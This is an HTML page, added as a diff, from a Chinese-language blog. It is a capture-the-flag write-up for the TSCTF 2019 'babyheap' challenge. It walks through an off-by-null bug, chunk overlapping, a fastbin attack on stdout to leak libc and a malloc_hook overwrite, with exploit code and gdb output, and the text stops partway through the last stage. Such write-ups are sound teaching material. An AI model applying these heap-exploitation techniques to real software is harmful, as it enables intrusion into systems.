@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="TSCTF2019线上赛的一道堆题，babyheap，果然叫这个名字的题目都很难，当时没做出来，当时堆的构造有问题，知道是用_IO_2_1_stdout_来泄露libc，在_IO_2_1_stdout_有一个0x7f，因此要构造一个大小为0x70的double free的堆块，使其进入到fastbin 0x70，然后修改其fd为stdout，但是在修改时这个堆块的size凑不成0x70了，再分配这">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TSCTF 2019 babyheap">
+<meta property="og:url" content="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="TSCTF2019线上赛的一道堆题，babyheap，果然叫这个名字的题目都很难，当时没做出来，当时堆的构造有问题，知道是用_IO_2_1_stdout_来泄露libc，在_IO_2_1_stdout_有一个0x7f，因此要构造一个大小为0x70的double free的堆块，使其进入到fastbin 0x70，然后修改其fd为stdout，但是在修改时这个堆块的size凑不成0x70了，再分配这">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/2.png">
+<meta property="og:updated_time" content="2019-06-08T08:38:39.961Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TSCTF 2019 babyheap">
+<meta name="twitter:description" content="TSCTF2019线上赛的一道堆题，babyheap，果然叫这个名字的题目都很难，当时没做出来，当时堆的构造有问题，知道是用_IO_2_1_stdout_来泄露libc，在_IO_2_1_stdout_有一个0x7f，因此要构造一个大小为0x70的double free的堆块，使其进入到fastbin 0x70，然后修改其fd为stdout，但是在修改时这个堆块的size凑不成0x70了，再分配这">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/"/>
+
+
+
+
+
+  <title>TSCTF 2019 babyheap | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/05/31/TSCTF-2019-babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TSCTF 2019 babyheap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-31T21:22:03+08:00">
+                2019-05-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>TSCTF2019线上赛的一道堆题，babyheap，果然叫这个名字的题目都很难，当时没做出来，当时堆的构造有问题，知道是用_IO_2_1_stdout_来泄露libc，在_IO_2_1_stdout_有一个0x7f，因此要构造一个大小为0x70的double free的堆块，使其进入到fastbin 0x70，然后修改其fd为stdout，但是在修改时这个堆块的size凑不成0x70了，再分配这个堆块时size就过不了检查了。赛后参考官方wp复现了一遍。</p>
+<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目有两个功能，申请和释放堆块，申请的堆块大小最大为0x100，个数最多为16个。libc版本为2.23。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WelCome TSCTF2019!!!! Have fun <span class="keyword">with</span> this babyheap!!!</span><br><span class="line">==============================</span><br><span class="line">=     <span class="number">1.</span> Alloc heap          =</span><br><span class="line">=     <span class="number">2.</span> Delete heap         =</span><br><span class="line">=     <span class="number">3.</span> Exit                =</span><br><span class="line">==============================</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目漏洞"><a href="#题目漏洞" class="headerlink" title="题目漏洞"></a>题目漏洞</h1><p>在read_data函数中有off by null的漏洞：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_data</span><span class="params">(__int64 data_buf, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> || buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    *(_BYTE *)(data_buf + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + data_buf) = <span class="number">0</span>; <span class="comment">//off by null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>因为没有show的功能，需要利用stdout来泄露libc，和另外一道babytcache相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.利用off by null进行chunk overlapping，构造一个大小为0x70的堆块处于double free状态，一个处于fastbin 0x70中，一个处于unsorted bin中，在其fd和bk写入main_arena附近的地址。</span><br><span class="line">3.修改该堆块的fd域的低字节至stdout附近，申请到该堆块并修改其flag和IO_write_base，泄露libc。</span><br><span class="line">3.再次进行chunk overlapping，申请malloc_hook-0x23处的堆块，修改malloc_hook为one_gadget。</span><br></pre></td></tr></table></figure></p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>初始化，申请5个堆块。要有一个0x70的chunk，要用来再malloc_hook-0x23处伪造chunk。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##init</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x80</span>) <span class="comment">#0 0x90</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'1'</span>*<span class="number">0x30</span>) <span class="comment">#1 0x40</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'2'</span>*<span class="number">0x60</span>) <span class="comment">#2 0x70</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'3'</span>*<span class="number">0xf0</span>) <span class="comment">#3 0x100</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'4'</span>*<span class="number">0x30</span>) <span class="comment">#4 0x40</span></span><br></pre></td></tr></table></figure></p>
+<p>释放idx2，再编辑修改idx3的prev_size为0x140,并通过off by null覆盖idx3的chunk的size由0x101变为0x100。进而释放idx0和idx3，再释放idx3时，查看其size为0x100，前一块为freed状态，会根据prev_size找到idx0，触发unink进行chunk的合并，且能通过检查，idx0和idx3合并进入到unsorted bin中，size=0x100+0x140=0x240。这样idx1-idx2就达到了chunk overlapping。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##overlap idx1+idx2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'2'</span>*<span class="number">0x60</span>+p64(<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#free into unsortedbin 0x140+0x100=0x240</span></span><br></pre></td></tr></table></figure></p>
+<p>此时bins的分布如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555757280</span> (size : <span class="number">0x20d80</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x555555757000</span> (size : <span class="number">0x240</span>)</span><br></pre></td></tr></table></figure></p>
+<p>继续分配chunk,大小一共为0x240，其中，idx3和idx1的起始地址时相同的，idx2和idx5也有重叠，分配完之后unsorted bin变为空。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">"0000\n"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"3333\n"</span>) <span class="comment">#3 0x60</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"5555\n"</span>) <span class="comment">#5 0x50</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">"6666\n"</span>) <span class="comment">#6 0x100</span></span><br></pre></td></tr></table></figure></p>
+<p>释放idx5,同样利用off by null将idx6的prev_size为0x140，依然和前一步一样，释放idx0和idx6，idx0和idx6合并，unsorted bin的大小为0x240，idx3和idx5也被认为是freed状态。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0xf0</span>+<span class="number">0x50</span>)) <span class="comment">#5 idx6:prev_size:0x140,size:0x100</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#free into unsortedbin 0x100+0x140 idx0~idx3+idx5~idx6</span></span><br></pre></td></tr></table></figure></p>
+<p>此时释放idx2进入到fastbin 0x70，再申请一个0xc0的chunk后，unsorted bin的chunk的起始地址和fastbin 0x70的起始地址相同。这样idx2的fd和bk就有了main_arena附近的地址，再次分配chunk清空unsorted bin。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>) <span class="comment">#free into fastbin 0x70</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">"0000\n"</span>) <span class="comment">#0 unsortedbin addr the same as fastbin 0x70</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">"6666\n"</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"7777\n"</span>) <span class="comment">#7</span></span><br></pre></td></tr></table></figure></p>
+<p>未分配idx2之前，bins的分布：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x5555557570d0</span> (size error (<span class="number">0x170</span>))</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555757280</span> (size : <span class="number">0x20d80</span>) </span><br><span class="line">       last_remainder: <span class="number">0x5555557570d0</span> (size : <span class="number">0x170</span>) </span><br><span class="line">            unsortbin: <span class="number">0x5555557570d0</span> (size : <span class="number">0x170</span>)</span><br><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x5555557570d0</span></span><br><span class="line"><span class="number">0x5555557570d0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000171</span></span><br><span class="line"><span class="number">0x5555557570e0</span>: <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x5555557570f0</span>: <span class="number">0x3232323232323232</span>  <span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x555555757100</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure></p>
+<p>分配了idx2之后bins的分布：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x5555557570d0</span> (size error (<span class="number">0x30</span>))</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555757280</span> (size : <span class="number">0x20d80</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555757100</span> (size : <span class="number">0x140</span>) </span><br><span class="line">            unsortbin: <span class="number">0x555555757100</span> (size : <span class="number">0x140</span>)</span><br></pre></td></tr></table></figure></p>
+<p>但此时fastbin 0x70中被分配了大小为0x30的idx2，前面说过idx2和idx5由重叠，我们可以将idx5先释放再申请来修正fastbin 0x70里chunk的size，同时覆写其fd为stdout附近。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##fastbin attack 0x70:idx2 -&gt; stdout near(0x7f) -&gt; 0x0</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#0x60 free into fastbin 0x60</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) +p64(<span class="number">0x71</span>) + <span class="string">'\xdd\x25'</span> + <span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x50</span>,payload) <span class="comment">#3</span></span><br></pre></td></tr></table></figure></p>
+<p>修改结果如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(0x70)     fastbin[5]: 0x5555557570d0 --&gt; 0x7ffff7dd25dd (size error (0x78)) --&gt; 0x0</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555757280</span> (size : <span class="number">0x20d80</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555757200</span> (size : <span class="number">0x40</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p>
+<p>申请两次申请到_IO_2_1_stdout_附近的堆块，修改其flag和write_base，泄露libc。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"7777\n"</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#9 stdout</span></span><br><span class="line">p.recvuntil(<span class="string">"\x00\x18\xad\xfb"</span>)</span><br><span class="line">p.recvn(<span class="number">28</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br></pre></td></tr></table></figure></p>
+<p>申请stdout附近堆块之前：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(0x70)     fastbin[5]: 0x7ffff7dd25dd (size error (0x78)) --&gt; 0x0</span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555757280</span> (size : <span class="number">0x20d80</span>) </span><br><span class="line">       last_remainder: <span class="number">0x555555757200</span> (size : <span class="number">0x40</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p>
+<p>泄露libc：<br><img src="/2019/05/31/TSCTF-2019-babyheap/1.png" alt="1"><br>再次利用off by null，注意此时我们的idx10的前一个堆块是idx4(0x40),修改idx11的prev_size为0x60(0x40+0x20)，并且覆盖其size为0x100，这样在delete(11)时会误认为它的前一个堆块处于freed状态，触发unlink会报错，因为它的size(0x40)！=prev_size(0x3434343434343434),然后就会触发malloc_printerr，进而触发我们后面的one_gadget。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">"aaaa\n"</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">"bbbb\n"</span>) <span class="comment">#11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x60</span>)) <span class="comment">#10 prev_size:0x60 idx4(0x40)+idx10(0x20)</span></span><br></pre></td></tr></table></figure></p>
